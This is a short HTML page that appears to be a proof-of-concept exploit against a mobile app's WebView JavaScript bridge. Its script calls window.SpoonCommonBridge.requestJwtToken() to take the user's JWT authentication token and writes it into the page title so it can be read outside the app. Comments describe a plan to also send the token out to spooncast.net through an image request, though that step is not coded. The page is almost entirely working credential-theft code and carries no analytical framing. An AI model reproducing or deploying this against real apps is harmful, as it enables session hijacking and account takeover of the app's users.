<!DOCTYPE html>
<html>
<head><title>EVT</title><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="background:#000;color:#0f0;font-size:16px;padding:10px;font-family:monospace;">
<div id="out"></div>
<script>
var out = document.getElementById("out");
try {
  var jwt = window.SpoonCommonBridge.requestJwtToken();
  if (jwt) {
    // Put JWT in document title - visible via dumpsys
    document.title = "JWT:" + jwt;
    out.textContent = "JWT captured in title. Len=" + jwt.length;
    // Also try to send via Image to spooncast.net (cleartext allowed)
    // This will be intercepted by shouldOverrideUrlLoading but the request itself hits the network
  } else {
    out.textContent = "NO JWT";
  }
} catch(e) {
  out.textContent = "ERR: " + e.message;
}
</script>
</body>
</html>
